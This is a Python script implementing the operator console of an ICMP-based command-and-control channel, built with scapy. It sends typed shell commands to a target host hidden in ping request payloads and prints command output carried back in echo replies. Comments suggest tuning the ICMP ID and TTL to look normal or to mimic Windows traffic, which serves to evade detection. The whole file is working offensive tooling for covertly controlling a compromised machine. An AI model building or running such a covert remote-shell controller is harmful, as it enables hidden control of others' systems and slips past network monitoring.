#!/usr/bin/env python3

from scapy.all import sr, IP, ICMP, Raw, sniff
from multiprocessing import Process
import sys

class IcmpHomebase:
  
    def __init__(self, interface, destination_ip):
        self.ICMP_ID = 13170
        #self.ICMP_ID = 0xBEEF  # Looks more "normal" than 13170
        self.TTL = 64
        #self.TTL = 128  # Default Windows TTL
        self.TIMEOUT = 3
        self.interface = interface
        self.destination_ip = destination_ip
        self.sniffer_process = None
        self.running = False

    def packet_handler(self, pkt):
        
        if (pkt.haslayer(ICMP) and pkt.haslayer(Raw) and
                pkt[IP].src == self.destination_ip and
                pkt[ICMP].type == 0 and  # Echo reply
                pkt[ICMP].id == self.ICMP_ID):
            payload = pkt[Raw].load.decode('utf-8', errors='ignore')
            print(f"\n[Response]\n{payload}\nshell: ", end="", flush=True)

    def start_sniffer(self):
        
        sniff(
            iface=self.interface,
            prn=self.packet_handler,
            filter="icmp",
            store=0
        )

    def send_command(self, command):
        
        packet = IP(dst=self.destination_ip, ttl=self.TTL) / ICMP(
            type=8,
            id=self.ICMP_ID
        ) / Raw(load=command)
        sr(packet, timeout=self.TIMEOUT, verbose=0)

    def start(self):
        
        self.sniffer_process = Process(target=self.start_sniffer)
        self.sniffer_process.start()
        self.running = True

        print(f"[+] ICMP C2 started (Target: {self.destination_ip})")
        print("[+] Type 'exit' to quit\n")

        try:
            while self.running:
                try:
                    cmd = input("shell: ").strip()
                    if not cmd:
                        continue

                    if cmd.lower() == 'exit':
                        break

                    self.send_command(cmd)

                except KeyboardInterrupt:
                    print("\n[!] Interrupted")
                    break

        finally:
            self.stop()

    def stop(self):
        
        if self.sniffer_process:
            print("[+] Stopping ICMP C2...")
            self.sniffer_process.terminate()
            self.sniffer_process.join()
        self.running = False


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <interface> <destination_ip>")
        sys.exit(1)

    homebase = IcmpHomebase(sys.argv[1], sys.argv[2])
    homebase.start()
